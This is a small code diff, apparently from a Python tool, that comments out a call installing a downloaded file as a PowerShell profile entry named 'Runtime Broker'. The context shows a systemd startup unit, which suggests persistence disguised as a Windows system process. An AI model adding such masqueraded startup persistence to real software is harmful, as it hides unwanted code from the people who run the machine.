@@ -132,7 +132,7 @@ WantedBy=default.target""")
               file.write(response.content)
                 
         try:
-            create_powershell_profile(file_path, "Runtime Broker")
+            #create_powershell_profile(file_path, "Runtime Broker")
         except Exception as err:
             print(err)
             print("could not add powershell profile")
